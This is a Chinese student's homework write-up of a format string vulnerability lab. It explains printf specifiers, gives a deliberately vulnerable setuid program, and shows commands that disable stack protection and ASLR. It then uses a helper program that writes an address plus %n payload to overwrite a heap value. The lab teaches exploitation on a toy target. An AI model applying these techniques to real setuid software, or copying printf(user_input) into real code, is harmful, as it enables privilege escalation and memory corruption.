<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>2021-2022-1 20212813《Linux内核原理与分析》第十二周作业 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="2021-2022-1 20212813《Linux内核原理与分析》第十二周作业" />
<meta property="og:description" content="格式化字符串漏洞实验 一、 实验描述二、实验预备知识讲解2.1 什么是格式化字符串？2.2 栈与格式化字符串2.3 如果参数数量不匹配会发生什么？ 三、实验内容3.1 实验 13.1.1 找出 secret[1]的值3.1.2 修改 secret[1]的值3.1.3 修改 secret[1]为期望值 3.2 实验 23.2.1 修改 secret[0]的值 一、 实验描述 格式化字符串漏洞是由像 printf(user_input) 这样的代码引起的，其中 user_input 是用户输入的数据，具有 Set-UID root 权限的这类程序在运行的时候，printf 语句将会变得非常危险，因为它可能会导致下面的结果：
使得程序崩溃任意一块内存读取数据修改任意一块内存里的数据 最后一种结果是非常危险的，因为它允许用户修改 set-UID root 程序内部变量的值，从而改变这些程序的行为。
二、实验预备知识讲解 2.1 什么是格式化字符串？ printf (&#34;The magic number is: %d&#34;, 1911); 上面的这段 C 语言代码运行结果为 The magic number is: 1911 ，你会发现字符串 The magic number is: %d 中的格式符 %d 被参数（1911）替换。
其他形式的格式符:
格式符含义含义（英）传%d十进制数（int）decimal值%u无符号十进制数 (unsigned int)unsigned decimal值%x十六进制数 (unsigned int)hexadecimal值%s字符串 ((const) (unsigned) char *)string引用（指针）%n%n 符号以前输入的字符数量 (* int)number of bytes written so far引用（指针） 2." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/973ace6fbda6bf55b29865bd47c58804/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2021-12-06T10:48:11+08:00" />
<meta property="article:modified_time" content="2021-12-06T10:48:11+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">2021-2022-1 20212813《Linux内核原理与分析》第十二周作业</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p></p> 
<div class="toc"> 
 <h4>格式化字符串漏洞实验</h4> 
 <ul><li><a href="#__1" rel="nofollow">一、 实验描述</a></li><li><a href="#_9" rel="nofollow">二、实验预备知识讲解</a></li><li><ul><li><a href="#21__10" rel="nofollow">2.1 什么是格式化字符串？</a></li><li><a href="#22__25" rel="nofollow">2.2 栈与格式化字符串</a></li><li><a href="#23__32" rel="nofollow">2.3 如果参数数量不匹配会发生什么？</a></li></ul> 
  </li><li><a href="#_48" rel="nofollow">三、实验内容</a></li><li><ul><li><a href="#31__1_49" rel="nofollow">3.1 实验 1</a></li><li><ul><li><a href="#311__secret1_100" rel="nofollow">3.1.1 找出 secret[1]的值</a></li><li><a href="#312__secret1_105" rel="nofollow">3.1.2 修改 secret[1]的值</a></li><li><a href="#313__secret1_108" rel="nofollow">3.1.3 修改 secret[1]为期望值</a></li></ul> 
   </li><li><a href="#32__2_110" rel="nofollow">3.2 实验 2</a></li><li><ul><li><a href="#321__secret0_188" rel="nofollow">3.2.1 修改 secret[0]的值</a></li></ul> 
  </li></ul> 
 </li></ul> 
</div> 
<p></p> 
<h2><a id="__1"></a>一、 实验描述</h2> 
<p>格式化字符串漏洞是由像 printf(user_input) 这样的代码引起的，其中 user_input 是用户输入的数据，具有 Set-UID root 权限的这类程序在运行的时候，printf 语句将会变得非常危险，因为它可能会导致下面的结果：</p> 
<ol><li>使得程序崩溃</li><li>任意一块内存读取数据</li><li>修改任意一块内存里的数据</li></ol> 
<p>最后一种结果是非常危险的，因为它允许用户修改 set-UID root 程序内部变量的值，从而改变这些程序的行为。</p> 
<h2><a id="_9"></a>二、实验预备知识讲解</h2> 
<h3><a id="21__10"></a>2.1 什么是格式化字符串？</h3> 
<pre><code class="prism language-c"><span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"The magic number is: %d"</span><span class="token punctuation">,</span> <span class="token number">1911</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>上面的这段 C 语言代码运行结果为 The magic number is: 1911 ，你会发现字符串 The magic number is: %d 中的格式符 %d 被参数（1911）替换。<br> 其他形式的格式符:</p> 
<table><thead><tr><th>格式符</th><th>含义</th><th>含义（英）</th><th>传</th></tr></thead><tbody><tr><td>%d</td><td>十进制数（int）</td><td>decimal</td><td>值</td></tr><tr><td>%u</td><td>无符号十进制数 (unsigned int)</td><td>unsigned decimal</td><td>值</td></tr><tr><td>%x</td><td>十六进制数 (unsigned int)</td><td>hexadecimal</td><td>值</td></tr><tr><td>%s</td><td>字符串 ((const) (unsigned) char *)</td><td>string</td><td>引用（指针）</td></tr><tr><td>%n</td><td>%n 符号以前输入的字符数量 (* int)</td><td>number of bytes written so far</td><td>引用（指针）</td></tr></tbody></table> 
<h3><a id="22__25"></a>2.2 栈与格式化字符串</h3> 
<p>格式化函数的行为由格式化字符串控制，printf 函数从栈上取得参数。</p> 
<pre><code class="prism language-c"><span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a has value %d, b has value %d, c is at address: %08x\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> <span class="token operator">&amp;</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span> 
</code></pre> 
<p><img src="https://images2.imgbox.com/a2/32/U2tpdxaN_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="23__32"></a>2.3 如果参数数量不匹配会发生什么？</h3> 
<pre><code class="prism language-c"><span class="token function">printf</span> <span class="token punctuation">(</span><span class="token string">"a has value %d, b has value %d, c is at address: %08x\n"</span><span class="token punctuation">,</span>a<span class="token punctuation">,</span> b<span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre> 
<p>在上面的例子，参数数量不匹配，格式字符串需要 3 个参数，但程序只提供了 2 个。<br> 该程序能够通过编译么？</p> 
<ul><li>printf() 是一个参数长度可变函数。因此，仅仅看参数数量是看不出问题的。</li><li>为了查出不匹配，编译器需要了解 printf() 的运行机制，然而编译器通常不做这类分析。</li><li>有些时候，格式字符串并不是一个常量字符串，它在程序运行期间生成(比如用户输入)，因此，编译器无法发现不匹配。</li></ul> 
<p>那么 printf() 函数自身能检测到不匹配么？</p> 
<ul><li>printf() 从栈上取得参数，如果格式字符串需要 3 个参数，它会从栈上取 3 个，除非栈被标记了边界，printf() 并不知道自己是否会用完提供的所有参数。</li><li>既然没有那样的边界标记。printf() 会持续从栈上抓取数据，在一个参数数量不匹配的例子中，它会抓取到一些不属于该函数调用到的数据。</li></ul> 
<h2><a id="_48"></a>三、实验内容</h2> 
<h3><a id="31__1_49"></a>3.1 实验 1</h3> 
<p>实验代码：</p> 
<pre><code class="prism language-c"><span class="token comment">/* vul_prog.c */</span> 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECRET1</span> <span class="token expression"><span class="token number">0x44</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECRET2</span> <span class="token expression"><span class="token number">0x55</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">char</span> user_input<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>secret<span class="token punctuation">;</span>
  <span class="token keyword">long</span> int_input<span class="token punctuation">;</span>
  <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span> <span class="token comment">/* other variables, not used here.*/</span>

  <span class="token comment">/* The secret value is stored on the heap */</span>
  secret <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* getting the secret */</span>
  secret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> SECRET1<span class="token punctuation">;</span> secret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SECRET2<span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The variable secret's address is 0x%8x (on stack)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The variable secret's value is 0x%8x (on heap)\n"</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[0]'s address is 0x%8x (on heap)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[1]'s address is 0x%8x (on heap)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter a decimal integer\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>int_input<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">/* getting an input from user */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter a string\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* getting a string from user */</span>

  <span class="token comment">/* Vulnerable place */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Verify whether your attack is successful */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The original secrets: 0x%x -- 0x%x\n"</span><span class="token punctuation">,</span> SECRET1<span class="token punctuation">,</span> SECRET2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The new secrets:      0x%x -- 0x%x\n"</span><span class="token punctuation">,</span> secret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> secret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>编译时添加以下参数关掉栈保护：</p> 
<pre><code class="prism language-bash">$ gcc -z execstack -fno-stack-protector -o vul_prog vul_prog.c 
$ <span class="token function">sudo</span> <span class="token function">chmod</span> u+s vul_prog
</code></pre> 
<p><img src="https://images2.imgbox.com/76/4f/5g8UfVBM_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="311__secret1_100"></a>3.1.1 找出 secret[1]的值</h4> 
<p>运行 vul_prog 程序去定位 int_input 的位置，这样就确认了 %s 在格式字符串中的位置。<br> <img src="https://images2.imgbox.com/68/50/NnwJ8aKy_o.png" alt="在这里插入图片描述"><br> 输入 secret[1] 的地址（十进制），同时在格式字符串中加入 %s ，可以看到第八个位置上为‘U’，即 secret[1] 的值。<br> <img src="https://images2.imgbox.com/35/68/X43M0wSg_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="312__secret1_105"></a>3.1.2 修改 secret[1]的值</h4> 
<p><img src="https://images2.imgbox.com/fd/46/EnkCUpaH_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="313__secret1_108"></a>3.1.3 修改 secret[1]为期望值</h4> 
<p><img src="https://images2.imgbox.com/20/61/cqtDo6U5_o.png" alt="在这里插入图片描述"></p> 
<h3><a id="32__2_110"></a>3.2 实验 2</h3> 
<p>实验代码如下：</p> 
<pre><code class="prism language-c"><span class="token comment">/* vul_prog.c */</span> 
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECRET1</span> <span class="token expression"><span class="token number">0x44</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">SECRET2</span> <span class="token expression"><span class="token number">0x55</span></span></span>

<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
  <span class="token keyword">char</span> user_input<span class="token punctuation">[</span><span class="token number">100</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token keyword">int</span> <span class="token operator">*</span>secret<span class="token punctuation">;</span>
  <span class="token keyword">int</span> a<span class="token punctuation">,</span> b<span class="token punctuation">,</span> c<span class="token punctuation">,</span> d<span class="token punctuation">;</span> <span class="token comment">/* other variables, not used here.*/</span>

  <span class="token comment">/* The secret value is stored on the heap */</span>
  secret <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">malloc</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* getting the secret */</span>
  secret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> SECRET1<span class="token punctuation">;</span> secret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> SECRET2<span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The variable secret's address is 0x%8x (on stack)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The variable secret's value is 0x%8x (on heap)\n"</span><span class="token punctuation">,</span> secret<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[0]'s address is 0x%8x (on heap)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"secret[1]'s address is 0x%8x (on heap)\n"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>secret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Please enter a string\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> user_input<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">/* getting a string from user */</span>

  <span class="token comment">/* Vulnerable place */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span>user_input<span class="token punctuation">)</span><span class="token punctuation">;</span>  
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

  <span class="token comment">/* Verify whether your attack is successful */</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The original secrets: 0x%x -- 0x%x\n"</span><span class="token punctuation">,</span> SECRET1<span class="token punctuation">,</span> SECRET2<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The new secrets:      0x%x -- 0x%x\n"</span><span class="token punctuation">,</span> secret<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span> secret<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre> 
<p>使用 linux 命令设置关闭地址随机化选项：</p> 
<pre><code class="prism language-bash"><span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">0</span>
</code></pre> 
<p>新建一个程序 write_string.c 。以下程序将一个格式化字符串写入了一个叫 mystring 的文件，前 4 个字节由任意你想放入格式化字符串的数字构成，接下来的字节由键盘输入:</p> 
<pre><code class="prism language-c"><span class="token comment">/* write_string.c */</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h&gt;</span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h&gt;</span></span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">{<!-- --></span>
    <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">1000</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> fp<span class="token punctuation">,</span> size<span class="token punctuation">;</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span>address<span class="token punctuation">;</span>
    <span class="token comment">/* Putting any number you like at the beginning of the format string */</span>
    address <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token operator">*</span><span class="token punctuation">)</span> buf<span class="token punctuation">;</span>
    <span class="token operator">*</span>address <span class="token operator">=</span> <span class="token number">0x113222580</span><span class="token punctuation">;</span>
    <span class="token comment">/* Getting the rest of the format string */</span>
    <span class="token function">scanf</span><span class="token punctuation">(</span><span class="token string">"%s"</span><span class="token punctuation">,</span> buf<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    size <span class="token operator">=</span> <span class="token function">strlen</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">4</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The string length is %d\n"</span><span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token comment">/* Writing buf to "mystring" */</span>
    fp <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"mystring"</span><span class="token punctuation">,</span> O_RDWR <span class="token operator">|</span> O_CREAT <span class="token operator">|</span> O_TRUNC<span class="token punctuation">,</span> S_IRUSR <span class="token operator">|</span> S_IWUSR<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>fp <span class="token operator">!=</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">write</span><span class="token punctuation">(</span>fp<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">close</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Open failed!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/58/88/Sreg6jFG_o.png" alt="在这里插入图片描述"></p> 
<h4><a id="321__secret0_188"></a>3.2.1 修改 secret[0]的值</h4> 
<p>修改 vul_prog.c 后编译 vul_prog.c 与 write_string.c：</p> 
<pre><code class="prism language-bash"><span class="token function">rm</span> vul_prog
gcc -z execstack -fno-stack-protector -o vul_prog vul_prog.c 
gcc -o write_string write_string.c
</code></pre> 
<p>先运行 vul_prog 程序，输入 4 个 %016llx 。再运行 write_string 程序，输入 8 个 %016llx 和 1 个 %n ，此操作会生成一个 mystring 文件。然后输入如下命令：</p> 
<pre><code class="prism language-bash">./vul_prog <span class="token operator">&lt;</span> mystring
</code></pre> 
<p><img src="https://images2.imgbox.com/14/60/Awd4saRq_o.png" alt="在这里插入图片描述"></p>
                </div>
		</div>
		<div id="gabottom"></div>
	</article>
</main>


<nav class="pager flex">
	<div class="pager__item pager__item--prev">
		<a class="pager__link" href="/posts/b4bcc07e38c693fece956f8d6c4b844d/" rel="prev">
			<span class="pager__subtitle">«&thinsp;Previous</span>
			<p class="pager__title">Java使用Redis及其优化</p>
		</a>
	</div>
	<div class="pager__item pager__item--next">
		<a class="pager__link" href="/posts/c6f07f1666d89c76e1206e583f33f19a/" rel="next">
			<span class="pager__subtitle">Next&thinsp;»</span>
			<p class="pager__title">JS逆向之x讯视频wasm的ckey分析</p>
		</a>
	</div>
</nav>


			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2024 菜鸟程序员博客.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>
<div id="gafoot"></div>
<script src="https://101121.xyz/ga/app.js"></script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>